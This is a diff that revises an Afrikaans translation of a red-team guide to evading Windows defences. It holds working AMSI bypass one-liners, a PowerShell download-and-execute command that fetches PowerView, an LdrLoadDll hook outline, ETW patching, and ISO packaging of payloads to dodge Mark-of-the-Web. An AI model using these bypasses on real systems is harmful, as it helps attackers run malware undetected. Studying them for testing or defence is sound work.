-Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.
+Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` sal die volgende waarskuwing op Windows Defender produseer.
 
 <figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>
 
-Let daarop dat dit `amsi:` vooran sit en dan die pad na die uitvoerbare lêer vanwaar die skrip gehardloop is, in hierdie geval, powershell.exe
+Let hoe dit `amsi:` vooraan plaas en dan die pad na die uitvoerbare program waarvan die script uitgevoer is, in hierdie geval, powershell.exe
 
-Ons het geen lêer na skyf gedruppel nie, maar is steeds in-memory gevang as gevolg van AMSI.
+Ons het geen lêer na skyf weggelaat nie, maar is steeds in-memory gevang as gevolg van AMSI.
 
-Moreover, starting with **.NET 4.8**, C# code is run through AMSI as well. This even affects `Assembly.Load(byte[])` to load in-memory execution. Thats why using lower versions of .NET (like 4.7.2 or below) is recommended for in-memory execution if you want to evade AMSI.
+Boonop, vanaf **.NET 4.8**, word C# code ook deur AMSI verwerk. Dit beïnvloed selfs `Assembly.Load(byte[])` om in-memory uitvoering te laai. Daarom word die gebruik van laer weergawes van .NET (soos 4.7.2 of laer) aanbeveel vir in-memory uitvoering as jy AMSI wil omseil.
 
-Daar is 'n paar maniere om om AMSI te kom:
+Daar is 'n paar maniere om AMSI te omseil:
 
 - **Obfuscation**
 
-Aangesien AMSI hoofsaaklik met static detections werk, kan dit 'n goeie manier wees om die skripte wat jy probeer laai te wysig om detectie te ontduik.
+Aangesien AMSI hoofsaaklik met statiese detectors werk, kan die wysiging van die scripts wat jy probeer laai 'n goeie manier wees om deteksie te ontduik.
 
-Tog het AMSI die vermoë om skripte te unobfuscateer selfs al het dit meerdere lae, so obfuscation kan 'n slegte opsie wees afhangend van hoe dit gedoen word. Dit maak dit nie so eenvoudig om te ontduik nie. Soms is al wat nodig is om 'n paar veranderlike name te verander en jy sal goed wees, dit hang dus af hoeveel iets opgemerk is.
+Echter, AMSI het die vermoë om scripts te unobfuscate selfs al het dit meerdere lae, so obfuscation kan 'n slegte opsie wees afhangend van hoe dit gedoen word. Dit maak dit nie noodwendig eenvoudig om te omseil nie. Soms hoef jy egter net 'n paar veranderlike name te verander en jy is gereed, so dit hang af hoeveel iets gemerk is.
 
 - **AMSI Bypass**
 
-Aangesien AMSI geïmplementeer word deur 'n DLL in die powershell (ook cscript.exe, wscript.exe, ens.) proses te laai, is dit moontlik om dit maklik te manipuleer selfs terwyl jy as 'n onprivilegieerde gebruiker loop. Weens hierdie fout in die implementering van AMSI, het navorsers verskeie maniere gevind om AMSI skandering te ontduik.
+Aangesien AMSI geïmplementeer word deur 'n DLL in die powershell (ook cscript.exe, wscript.exe, ens.) proses te laai, is dit moontlik om dit maklik te manipuleer selfs terwyl jy as 'n onprivilegieerde gebruiker loop. Vanweë hierdie gebrek in die implementering van AMSI het navorsers verskeie maniere gevind om AMSI-skandering te ontduik.
 
 **Forcing an Error**
 
-Forcing the AMSI initialization to fail (amsiInitFailed) will result that no scan will be initiated for the current process. Originally this was disclosed by [Matt Graeber](https://twitter.com/mattifestation) and Microsoft has developed a signature to prevent wider usage.
+Afdwing van die AMSI-initialisering om te misluk (amsiInitFailed) sal tot gevolg hê dat geen skandering vir die huidige proses geïnisieer word nie. Aanvanklik is dit bekend gemaak deur [Matt Graeber](https://twitter.com/mattifestation) en Microsoft het 'n signature ontwikkel om wyer gebruik te voorkom.
 ```bash
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 ```
-Alles wat dit geverg het, was een reël powershell-kode om AMSI onbruikbaar te maak vir die huidige powershell-proses. Hierdie reël is natuurlik deur AMSI self gekenmerk, dus is 'n aanpassing nodig om hierdie tegniek te gebruik.
+Dit het net een reël powershell code geneem om AMSI onbruikbaar te maak vir die huidige powershell-proses. Hierdie reël is natuurlik deur AMSI self gevlag, dus is 'n aanpassing nodig om hierdie tegniek te gebruik.
 
 Hier is 'n gemodifiseerde AMSI bypass wat ek van hierdie [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) geneem het.
 ```bash
@@ -280,22 +306,22 @@ $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
 $Spotfix.SetValue($null,$true)
 }Catch{Throw $_}
 ```
-Hou in gedagte dat dit waarskynlik gemerk sal word sodra hierdie pos uitkom, dus moet jy nie enige code publiseer as jou plan is om onopgemerk te bly.
+Hou in gedagte dat dit waarskynlik opgemerk sal word sodra hierdie pos uitkom; as jou plan is om onopgemerk te bly, moet jy geen kode publiseer nie.
 
 **Memory Patching**
 
 This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.
 
 > [!TIP]
-> Lees asseblief [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) vir 'n meer gedetailleerde verduideliking.
+> Lees asseblief [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) vir 'n meer gedetaileerde verduideliking.
 
-There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.
+Daar is ook baie ander tegnieke wat gebruik word om AMSI met powershell te omseil; kyk na [**hierdie bladsy**](basic-powershell-for-pentesters/index.html#amsi-bypass) en [**hierdie repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) om meer daaroor te leer.
 
-### Blokkeer AMSI deur die laai van amsi.dll te voorkom (LdrLoadDll hook)
+### Blokkeer AMSI deur te voorkom dat amsi.dll gelaai word (LdrLoadDll hook)
 
-AMSI is initialised only after `amsi.dll` is loaded into the current process. 'n Robuuste, taalonafhanklike omseiling is om 'n user‑mode hook op `ntdll!LdrLoadDll` te plaas wat 'n fout teruggee wanneer die aangevraagde module `amsi.dll` is. Gevolglik laai AMSI nooit en geen skanderings vind plaas vir daardie proses nie.
+AMSI word eers geïnisialiseer nadat `amsi.dll` in die huidige proses gelaai is. 'n Robuuste, taalonafhanklike bypass is om 'n user‑mode hook op `ntdll!LdrLoadDll` te plaas wat 'n fout teruggee wanneer die aangevraagde module `amsi.dll` is. As gevolg daarvan laai AMSI nooit en vind daar geen skanderings vir daardie proses plaas nie.
 
-Implementasie-oorsig (x64 C/C++ pseudokode):
+Implementasie-oorsig (x64 C/C++ pseudocode):
 ```c
 #include <windows.h>
 #include <winternl.h>
@@ -321,73 +347,73 @@ realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
 // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
 }
 ```
-Notes
-- Werk oor PowerShell, WScript/CScript en pasgemaakte loaders (alles wat andersins AMSI sou laai).
-- Gebruik saam met die invoer van skripte via stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) om lang opdragreël-artefakte te vermy.
-- Is waargeneem in loaders wat via LOLBins uitgevoer word (bv. `regsvr32` wat `DllRegisterServer` aanroep).
+Aantekeninge
+- Werk oor PowerShell, WScript/CScript en persoonlike loaders (enige iets wat andersins AMSI sal laai).
+- Kombineer met die voerin van skripte oor stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) om lang opdragreël-artefakte te vermy.
+- Waargeneem in gebruik deur loaders wat via LOLBins uitgevoer word (bv., `regsvr32` wat `DllRegisterServer` aanroep).
 
-Die instrument **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** genereer ook skripte om AMSI te omseil.
-Die instrument **[https://amsibypass.com/](https://amsibypass.com/)** genereer ook skripte om AMSI te omseil deur handtekenings te vermy met gerandomiseerde gebruiker-gedefinieerde funksies, veranderlikes, karakteruitdrukkings en deur ewekansige karaktergrootte (case) op PowerShell-sleutelwoorde toe te pas om handtekenings te vermy.
+Die hulpmiddel **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** genereer ook skrip om AMSI te omseil.
+Die hulpmiddel **[https://amsibypass.com/](https://amsibypass.com/)** genereer ook skripte om AMSI te omseil wat handtekeninge vermy deur gebruikersgedefinieerde funksies, veranderlikes en karakteruitdrukkings te randomiseer, en wat lukrake karakter‑hoofdletters/kleinskryf op PowerShell‑sleutelwoorde toepas om handtekeninge te omseil.
 
 **Verwyder die gedetekteerde handtekening**
 
-Jy kan 'n instrument soos **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** en **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** gebruik om die gedetekteerde AMSI-handtekening uit die geheue van die huidige proses te verwyder. Hierdie instrument werk deur die geheue van die huidige proses te deursoek vir die AMSI-handtekening en dit dan met NOP-instruksies te oorskryf, wat dit effektief uit die geheue verwyder.
+Jy kan 'n hulpmiddel soos **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** en **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** gebruik om die gedetekteerde AMSI‑handtekening uit die geheue van die huidige proses te verwyder. Hierdie hulpmiddel werk deur die geheue van die huidige proses te skandeer vir die AMSI‑handtekening en dit dan met NOP‑instruksies te oorskryf, wat dit effektief uit die geheue verwyder.
 
 **AV/EDR-produkte wat AMSI gebruik**
 
-Jy kan 'n lys van AV/EDR-produkte wat AMSI gebruik vind by **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.
+Jy kan 'n lys van AV/EDR‑produkte wat AMSI gebruik vind by **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.
 
 **Gebruik PowerShell weergawe 2**
-As jy PowerShell weergawe 2 gebruik, sal AMSI nie gelaai word nie, daarom kan jy jou skripte uitvoer sonder dat AMSI dit skandeer. Jy kan dit soos volg doen:
+As jy PowerShell weergawe 2 gebruik, sal AMSI nie gelaai word nie, sodat jy jou skripte kan uitvoer sonder dat AMSI dit sal skandeer. Jy kan dit so doen:
 ```bash
 powershell.exe -version 2
 ```
 ## PS Logging
 
-PowerShell logging is 'n funksie wat jou toelaat om alle PowerShell commands wat op 'n stelsel uitgevoer word, te registreer. Dit kan nuttig wees vir oudits en foutopsporing, maar dit kan ook 'n **probleem wees vir aanvallers wat opsporing wil ontduik**.
+PowerShell logging is a feature that allows you to log all PowerShell commands executed on a system. Dit kan nuttig wees vir auditering en foutopsporing, maar dit kan ook 'n **probleem vir attackers wat opsporing wil ontduik** wees.
 
-Om PowerShell logging te omseil, kan jy die volgende tegnieke gebruik:
+To bypass PowerShell logging, you can use the following techniques:
 
 - **Disable PowerShell Transcription and Module Logging**: Jy kan 'n hulpmiddel soos [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) hiervoor gebruik.
-- **Use Powershell version 2**: As jy PowerShell version 2 gebruik, sal AMSI nie gelaai word nie, sodat jy jou skripte kan uitvoer sonder dat AMSI hulle skandeer. Jy kan dit so doen: `powershell.exe -version 2`
-- **Use an Unmanaged Powershell Session**: Gebruik [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) om 'n powershell sonder verdediging te spawn (dit is wat `powerpick` from Cobal Strike uses).
+- **Use Powershell version 2**: As jy PowerShell version 2 gebruik, sal AMSI nie gelaai word nie, sodat jy jou skripte kan uitvoer sonder om deur AMSI gescan te word. Jy kan dit so doen: `powershell.exe -version 2`
+- **Use an Unmanaged Powershell Session**: Gebruik [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) om 'n powershell sonder verdediging te spawn (dit is wat `powerpick` van Cobal Strike gebruik).
 
 
 ## Obfuscation
 
 > [!TIP]
-> Verskeie obfuscation techniques staatmaak op die enkripsie van data, wat die entropie van die binêr sal verhoog en dit vir AVs en EDRs makliker sal maak om dit te detect. Wees versigtig hiermee en oorweeg om enkripsie slegs toe te pas op spesifieke gedeeltes van jou kode wat sensitief is of weggesteek moet word.
+> Several obfuscation techniques relies on encrypting data, which will increase the entropy of the binary which will make easier for AVs and EDRs to detect it. Wees versigtig hiermee en oorweeg om enkripsie slegs op spesifieke gedeeltes van jou kode toe te pas wat sensitief is of weggeborg moet word.
 
 ### Deobfuscating ConfuserEx-Protected .NET Binaries
 
-Wanneer jy malware ontleed wat ConfuserEx 2 (of kommersiële forks) gebruik, is dit algemeen om verskeie beskermingslae te tref wat dekompilers en sandboxes blokkeer. Die onderstaande werkvloei herstel betroubaar 'n byna oorspronklike IL wat daarna na C# gedecompileer kan word in gereedskap soos dnSpy of ILSpy.
+Wanneer jy malware ontleed wat ConfuserEx 2 (of kommersiële forks) gebruik, is dit algemeen om verskeie beskermingslae te teëkom wat dekompileerders en sandbokse sal blokkeer. Die onderstaande workflow herstel betroubaar 'n byna–oorblywende IL wat daarna in C# gedecompileer kan word in gereedskap soos dnSpy of ILSpy.
 
-1.  Anti-tampering removal – ConfuserEx enkripteer elke *method body* en ontsleutel dit binne die *module* static constructor (`<Module>.cctor`). Dit pleeg ook 'n aanpassing van die PE checksum sodat enige wysiging die binêr sal laat crash. Gebruik **AntiTamperKiller** om die enkripteerde metadata-tabelle te vind, die XOR keys te herstel en 'n skoon assembly te skryf:
+1.  Anti-tampering removal – ConfuserEx enkripsieer elke *method body* en dekripteer dit binne die *module* static constructor (`<Module>.cctor`). Dit patch ook die PE checksum sodat enige modifikasie die binêre sal laat crash. Gebruik **AntiTamperKiller** om die enkripsieerde metadata-tabelle te lokaliseer, die XOR-sleutels te herstel en 'n skoon assembly te herskryf:
 ```bash
 # https://github.com/wwh1004/AntiTamperKiller
 python AntiTamperKiller.py Confused.exe Confused.clean.exe
 ```
-Die uitvoer bevat die 6 anti-tamper parameters (`key0-key3`, `nameHash`, `internKey`) wat nuttig kan wees wanneer jy jou eie unpacker bou.
+Die output bevat die 6 anti-tamper parameters (`key0-key3`, `nameHash`, `internKey`) wat nuttig kan wees wanneer jy jou eie unpacker bou.
 
-2.  Symbol / control-flow recovery – voer die *clean* lêer in by **de4dot-cex** (a ConfuserEx-aware fork of de4dot).
+2.  Symbol / control-flow recovery – voer die *clean* lêer in by **de4dot-cex** (n ConfuserEx-aware fork van de4dot).
 ```bash
 de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
 ```
-Vlagte:
+Flags:
 • `-p crx` – kies die ConfuserEx 2 profiel  
-• de4dot sal control-flow flattening ongedaan maak, oorspronklike namespaces, classes en veranderlike name herstel en konstante stringe ontsleutel.
+• de4dot sal control-flow flattening ongedaan maak, oorspronklike namespaces, klasse en veranderlike name herstel en konstante stringe dekripteer.
 
-3.  Proxy-call stripping – ConfuserEx vervang direkte method calls met liggewig wrappers (a.k.a *proxy calls*) om dekompilasie verder te breek. Verwyder dit met **ProxyCall-Remover**:
+3.  Proxy-call stripping – ConfuserEx vervang direkte metode-oproepe met liggewig wrappers (a.k.a *proxy calls*) om verdere dekompilasie te breek. Verwyder dit met **ProxyCall-Remover**:
 ```bash
 ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
 ```
-Na hierdie stap behoort jy normale .NET API's soos `Convert.FromBase64String` of `AES.Create()` te sien in plaas van opake wrapper funksies (`Class8.smethod_10`, …).
+Na hierdie stap behoort jy normale .NET API's soos `Convert.FromBase64String` of `AES.Create()` te sien in plaas van opaak wrapper-funksies (`Class8.smethod_10`, …).
 
-4.  Manual clean-up – voer die resulterende binêr onder dnSpy, soek na groot Base64 blobs of gebruik van `RijndaelManaged`/`TripleDESCryptoServiceProvider` om die *real* payload te lokaliseer. Dikwels stoor die malware dit as 'n TLV-encoded byte array geïnitialiseer binne `<Module>.byte_0`.
+4.  Manual clean-up – voer die resulterende binêr onder dnSpy uit, soek na groot Base64-blobs of `RijndaelManaged`/`TripleDESCryptoServiceProvider` gebruik om die *egte* payload te lokaliseer. Dikwels stoor die malware dit as 'n TLV-geënkodeerde byte array geïnitialiseer binne `<Module>.byte_0`.
 
-Die bogenoemde ketting herstel die uitvoerstroom **sonder** om die malicious sample te moet loop – handig wanneer jy op 'n offline workstation werk.
+Hierdie ketting herstel die uitvoeringstroom **sonder** dat dit nodig is om die kwaadwillige monster te laat loop – nuttig wanneer jy op 'n offline werkstasie werk.
 
-> 🛈  ConfuserEx produseer 'n pasgemaakte attribuut genaamd `ConfusedByAttribute` wat as 'n IOC gebruik kan word om monsters outomaties te triage.
+> 🛈  ConfuserEx produseer 'n custom attribute met die naam `ConfusedByAttribute` wat as 'n IOC gebruik kan word om monsters outomaties te triage.
 
 #### One-liner
 ```bash
@@ -396,39 +422,39 @@ autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
 ---
 
 - [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
-- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Die doel van hierdie projek is om 'n open-source fork van die [LLVM](http://www.llvm.org/) kompilasie-suite te verskaf wat verbeterde sagteware-sekuriteit kan bied deur middel van [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) en tamper-proofing.
-- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstreer hoe om die `C++11/14` taal te gebruik om, tydens kompilasie, obfuscated code te genereer sonder om enige eksterne hulpmiddel te gebruik of die compiler te verander.
-- [**obfy**](https://github.com/fritzone/obfy): Voeg 'n laag van obfuscated operations by wat gegenereer word deur die C++ template metaprogramming raamwerk, wat die lewe van die persoon wat die application wil crack 'n bietjie moeiliker sal maak.
-- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz is 'n x64 binary obfuscator wat verskeie verskillende PE files kan obfuscate, insluitend: .exe, .dll, .sys
+- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Die doel van hierdie projek is om 'n open-source fork van die [LLVM](http://www.llvm.org/) kompilasie-suite te verskaf wat verhoogde sagteware-sekuriteit deur [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) en tamper-proofing kan bied.
+- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstreer hoe om die `C++11/14` taal te gebruik om tydens kompilering obfuscated code te genereer sonder om enige eksterne hulpmiddel te gebruik en sonder om die kompilator te wysig.
+- [**obfy**](https://github.com/fritzone/obfy): Voeg 'n laag van obfuscated operations by wat gegenereer word deur die C++ template metaprogramming framework wat die lewe van die persoon wat die toepassing wil crack 'n bietjie moeiliker sal maak.
+- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz is 'n x64 binary obfuscator wat verskeie verskillende PE-lêers kan obfuskeer, insluitend: .exe, .dll, .sys
 - [**metame**](https://github.com/a0rtega/metame): Metame is 'n eenvoudige metamorphic code engine vir arbitrêre executables.
-- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator is 'n fynkorrelige code obfuscation raamwerk vir LLVM-supported languages wat ROP (return-oriented programming) gebruik. ROPfuscator obfuscates 'n program op assembly code-vlak deur gewone instruksies in ROP chains te transformeer, wat ons natuurlike idee van normale control flow teengaan.
+- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator is 'n fynkorrelige code obfuscation framework vir LLVM-ondersteunde tale wat ROP (return-oriented programming) gebruik. ROPfuscator obfuskeer 'n program op die assembly code level deur gewone instruksies in ROP chains te transformeer, en daarmee ons natuurlike konsep van normale control flow ontwrig.
 - [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt is 'n .NET PE Crypter geskryf in Nim
 - [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor kan bestaande EXE/DLL omskakel na shellcode en dit dan laai
 
 ## SmartScreen & MoTW
 
-Jy het dalk hierdie skerm gesien wanneer jy sekere executables van die internet afgelaai en uitgevoer het.
+Jy het dalk hierdie skerm gesien wanneer jy sekere uitvoerbare lêers vanaf die internet aflaai en dit uitvoer.
 
-Microsoft Defender SmartScreen is 'n sekuriteitsmeganisme wat bedoel is om die eindgebruiker te beskerm teen die uitvoering van potensieel kwaadwillige applications.
+Microsoft Defender SmartScreen is 'n sekuriteitsmeganisme wat bedoel is om die eindgebruiker te beskerm teen die uitvoer van moontlik kwaadwillige toepassings.
 
 <figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>
 
-SmartScreen werk hoofsaaklik met 'n reputation-based benadering, wat beteken dat seldsame afgelaaide applications SmartScreen sal trigger, wat waarsku en die eindgebruiker verhinder om die lêer uit te voer (alhoewel die lêer steeds uitgevoer kan word deur te klik More Info -> Run anyway).
+SmartScreen werk hoofsaaklik met 'n reputasie-gebaseerde benadering, wat beteken dat ongewone afgelaaide toepassings SmartScreen sal aktiveer en sodoende die eindgebruiker waarsku en verhinder om die lêer uit te voer (alhoewel die lêer steeds uitgevoer kan word deur op More Info -> Run anyway te klik).
 
-**MoTW** (Mark of The Web) is 'n [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) met die naam Zone.Identifier wat outomaties geskep word wanneer lêers van die internet afgelaai word, saam met die URL waarvandaan dit afgelaai is.
+**MoTW** (Mark of The Web) is 'n [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) met die naam Zone.Identifier wat outomaties geskep word wanneer lêers vanaf die internet afgelaai word, tesame met die URL waarvan dit afgelaai is.
 
-<figure><img src="../images/image (237).png" alt=""><figcaption><p>Kontroleer die Zone.Identifier ADS vir 'n lêer wat van die internet afgelaai is.</p></figcaption></figure>
+<figure><img src="../images/image (237).png" alt=""><figcaption><p>Kontroleer die Zone.Identifier ADS vir 'n lêer wat vanaf die internet afgelaai is.</p></figcaption></figure>
 
 > [!TIP]
-> Dit is belangrik om te let dat executables wat onderteken is met 'n **trusted** signing certificate **nie SmartScreen sal trigger nie**.
+> Dit is belangrik om te let dat uitvoerbare lêers wat met 'n **trusted** signing certificate onderteken is **won't trigger SmartScreen**.
 
-'n Baie effektiewe manier om te verhoed dat jou payloads die Mark of The Web kry, is om dit binne 'n soort container soos 'n ISO te pakket. Dit gebeur omdat Mark-of-the-Web (MOTW) **nie** toegepas kan word op **non NTFS** volumes nie.
+'n Baie effektiewe manier om te verhoed dat jou payloads die Mark of The Web kry, is om hulle in 'n soort houer te verpak, soos 'n ISO. Dit gebeur omdat Mark-of-the-Web (MOTW) **cannot** toegepas word op **non NTFS** volumes.
 
 <figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>
 
-[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) is 'n hulpmiddel wat payloads in output containers pak om Mark-of-the-Web te ontduik.
+[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) is 'n hulpmiddel wat payloads in uitvoerhouers verpak om Mark-of-the-Web te ontduik.
 
-Voorbeeld van gebruik:
+Voorbeeldgebruik:
 ```bash
 PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso
 
@@ -450,57 +476,57 @@ Adding file: /TotallyLegitApp.exe
 
 [+] Generated file written to (size: 3420160): container.iso
 ```
-Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)
+Hier is 'n demo om SmartScreen te omseil deur payloads binne ISO-lêers te verpak met [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)
 
 <figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>
 
 ## ETW
 
-Event Tracing for Windows (ETW) is 'n kragtige logmeganisme in Windows wat toepassings en stelselkomponente toelaat om **gebeure te loog**. Dit kan egter ook deur sekuriteitsprodukte gebruik word om kwaadwillige aktiwiteite te monitor en op te spoor.
+Event Tracing for Windows (ETW) is 'n kragtige logmeganisme in Windows wat toepassings en stelselkomponente toelaat om **gebeure te registreer**. Dit kan egter ook deur sekuriteitsprodukte gebruik word om kwaadwillige aktiwiteite te monitor en te ontdek.
 
-Soos hoe AMSI gedeaktiveer (omseil) word, is dit ook moontlik om die **`EtwEventWrite`**-funksie van die user space-proses onmiddellik terug te laat keer sonder om enige gebeure te loog. Dit word gedoen deur die funksie in geheue te patch sodat dit dadelik terugkeer, en sodoende ETW-logging vir daardie proses effektief te deaktiveer.
+Soos hoe AMSI gedeaktiveer (omseil) word, is dit ook moontlik om die **`EtwEventWrite`**-funksie van die gebruikersruimte-proses onmiddellik te laat terugkeer sonder om enige gebeurtenisse te registreer. Dit word gedoen deur die funksie in geheue te patseer sodat dit onmiddellik terugkeer, waardeur ETW-registrasie vir daardie proses effektief gedeaktiveer word.
 
-You can find more info in **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.
+Meer inligting vind jy by **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/)** en **[https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.
 
 
 ## C# Assembly Reflection
 
-Loading C# binaries in memory has been known for quite some time and it's still a very great way for running your post-exploitation tools without getting caught by AV.
+Loading C# binaries in memory is al vir 'n geruime tyd bekend en dit is steeds 'n uitstekende manier om jou post-exploitation-instrumente te laat loop sonder om deur AV gevang te word.
 
-Aangesien die payload direk in geheue gelaai word sonder om die skyf te raak, hoef ons net bekommerd te wees oor die patching van AMSI vir die hele proses.
+Aangesien die payload direk in geheue gelaai word sonder die skyf aan te raak, hoef ons slegs bekommerd te wees oor die patseer van AMSI vir die hele proses.
 
-Die meeste C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) bied reeds die vermoë om C# assemblies direk in geheue uit te voer, maar daar is verskillende maniere om dit te doen:
+Die meeste C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, ens.) bied reeds die vermoë om C# assemblies direk in geheue uit te voer, maar daar is verskeie maniere om dit te doen:
 
 - **Fork\&Run**
 
-Dit behels **om 'n nuwe offersproses te spawnen**, die post-exploitation kwaadwillige kode in daardie nuwe proses te inject, jou kwaadwillige kode uit te voer en, wanneer klaar, die nuwe proses te beëindig. Dit het beide voordele en nadele. Die voordeel van die fork-and-run-metode is dat uitvoering plaasvind **buite** ons Beacon implant-proses. Dit beteken dat as iets in ons post-exploitation-aksie verkeerd gaan of gevang word, daar 'n **veel groter kans** is dat ons **implant oorleef.** Die nadeel is dat jy 'n **groter kans** het om deur **Behavioural Detections** gevang te word.
+Dit behels die skep van 'n nuwe offer-proses, die inject van jou post-exploitation-malisieuse kode in daardie nuwe proses, die uitvoering van jou malisieuse kode en, wanneer voltooi, die beëindiging van die nuwe proses. Dit het beide voordele en nadele. Die voordeel van die fork-and-run-metode is dat uitvoering **buite** ons Beacon-implant proses plaasvind. Dit beteken dat indien iets in ons post-exploitation-aksie verkeerd loop of gevang word, daar 'n **veel groter kans** is dat ons **implant oorleef.** Die nadeel is dat jy 'n **groter kans** het om deur **Behavioural Detections** gevang te word.
 
 <figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>
 
 - **Inline**
 
-Dit gaan oor om die post-exploitation kwaadwillige kode **in sy eie proses** te inject. Op hierdie manier kan jy vermy om 'n nuwe proses te skep wat deur AV gescan word, maar die nadeel is dat as iets verkeerd gaan met die uitvoering van jou payload, daar 'n **veel groter kans** is om jou beacon te verloor aangesien dit kan crash.
+Dit gaan oor die inject van die post-exploitation-malisieuse kode **in sy eie proses**. Op hierdie manier kan jy die skepping van 'n nuwe proses en die moontlikheid van AV-skandering vermy, maar die nadeel is dat as iets verkeerd gaan met die uitvoering van jou payload, daar 'n **veel groter kans** is om jou **beacon te verloor** aangesien dit kan crash.
 
 <figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>
 
 > [!TIP]
-> If you want to read more about C# Assembly loading, please check out this article [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) and their InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))
+> As jy meer wil lees oor C# Assembly loading, kyk asseblief na hierdie artikel [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) en hul InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))
 
-You can also load C# Assemblies **from PowerShell**, check out [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) and [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).
+Jy kan ook C# Assemblies **vanuit PowerShell** laai; kyk na [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) en S3cur3th1sSh1t se video (https://www.youtube.com/watch?v=oe11Q-3Akuk).
 
 ## Using Other Programming Languages
 
